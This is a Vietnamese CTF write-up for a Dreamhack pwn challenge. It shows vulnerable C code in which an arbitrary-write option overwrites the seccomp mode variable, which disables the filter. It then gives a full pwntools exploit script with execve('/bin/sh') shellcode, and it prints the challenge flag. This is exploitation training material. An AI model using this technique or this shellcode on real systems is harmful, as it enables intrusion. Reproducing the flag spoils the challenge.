# Seccomp

1 chall khá lạ yêu cầu phải hiểu về **Seccomp Filter**, nghiên cứu về **Seccomp Filter** tại:

**dreamhack:** https://learn.dreamhack.io/11#30

## scouce C
```c 
// gcc -o seccomp seccomp.cq
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <sys/mman.h>

int mode = SECCOMP_MODE_STRICT;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))
    
    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };
    
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }
    
    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}


int main(int argc, char* argv[])
{
    void (*sc)();
    unsigned char *shellcode;
    int cnt = 0;
    int idx;
    long addr;
    long value;

    initialize();

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
    return 0;
}
```

ở đây nó có hàm **syscall_fillter** giống với **seccomp fillter**

ở đây ta có 3 option, **nhập 1 cho phép ta nhập shellcode, nhập 2 thì thực thi shellcode, còn nhập 3 thì cho phép ta thay đổi giá trị của 1 địa chỉ ta muốn**

hmm để làm được bài này thì ta **cần phân tích hàm syscall_filler**

## Phân tích

thì trước khi phân tích thì ta cần biết sơ về 2 loại seccomp là **seccomp STRICT_MODE  và FILTER_MODE**

![image](https://github.com/gookoosss/CTF/assets/128712571/1320f499-edc4-4079-a5dc-0746ef746c88)


**tạm hiểu là :** 
- **STRICT_MODE** cho phép sử dụng các syscall read, write, exit, sigreturn
- **FILTER_MODE** thì được thay đổi giới hạn cái syscall cho phép 

tại đây thì **syscall_filler nó tương đương như seccomp SRICT_MODE**, 

### Lý do:

tại sao mình biết thì tại biến **mode nhận giá trị là hằng số SECCOMP_MODE_STRICT** trong **thư viện linux/seccomp.h (hằng số này là 1)**

```c
int mode = SECCOMP_MODE_STRICT
```

![image](https://github.com/gookoosss/CTF/assets/128712571/2f2bbc66-f633-4288-a938-a6ba0e5cca8b)




vây bây giờ cái **syscall ta có thể dùng là read, write, exit, sigreturn thôi**, ko đủ để ta khai thác

phân tích tiếp hàm **syscall_fillter** thì ta thấy if này:

```c 
if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
    perror("Seccomp filter error\n");
    return -1;
    }
```

**phân tích if này:**

![image](https://github.com/gookoosss/CTF/assets/128712571/3d9870ed-4beb-458c-9655-5501cc6c11dc)


à vậy nếu hàm if này thực thi được thì **ta hoàn toàn có thể vô hiệu hóa syscall_fillter rồi, giờ ta chỉ cần cho prctl() trả về -1  là được**

![image](https://github.com/gookoosss/CTF/assets/128712571/9ee57d96-6dbd-4217-b4c3-26d6b08ec31f)


như ảnh trên thì trường hợp 1 và 3 thì ta ko có quyền thay đổi r đó nên bỏ qua

**nhưng trường hợp 2 thì hoàn toàn có thể vì ta có thể thay đổi giá trị chỉ biến mode đang chứa hằng số SECCOMP_MODE_STRICT** thành 1 số khác bất kì thông lần nhập 3 đúng ko nào ??

### Tóm tắt ý tướng:

```tìm mode addr -> thay đổi mode -> nhập shellcode -> chạy shellcode```

## Khai thác

- **Stage 1: thay đổi mode**

giờ ta tìm địa chỉ của mode và giá trị nó đang chứa có phải bằng 1 ko

![image](https://github.com/gookoosss/CTF/assets/128712571/51f670d3-9865-4738-a748-19715732e5c1)


đúng như ta dự đoán luôn, giờ chọn option 3 rồi thay đổi 1 giá trị bất kì thôi

```python 
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ', b'5')
```

- **Stage 2: nhập shell và chạy shell**

chọn option 1 và nhập shell rồi chạy thôi:

```python 

shellcode = asm(
    '''
    mov rax , 29400045130965551
    push rax

    mov rax, 0x3b
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rsp
    syscall
    ''', arch='amd64')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'shellcode: ', shellcode)
p.sendlineafter(b'> ', b'2')

```

sau đó thì ta lấy được shell và có flag

![image](https://github.com/gookoosss/CTF/assets/128712571/85f9905a-520b-4e97-a657-e11cde0316f7)



## script

```python 
from pwn import *
# p = process('./seccomp')
p = remote('host3.dreamhack.games', 19090)

# gdb.attach(p, gdbscript = '''
# b*main+150
# c        
           
# ''')

# input()

shellcode = asm(
    '''
    mov rax , 29400045130965551
    push rax

    mov rax, 0x3b
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rsp
    syscall
    ''', arch='amd64')

mode = 0x602090

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ', b'5')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'shellcode: ', shellcode)
p.sendlineafter(b'> ', b'2')


p.interactive()

# DH{22b3695a64092efd8845efe7eda784a4}

```

## Flag:

DH{22b3695a64092efd8845efe7eda784a4}




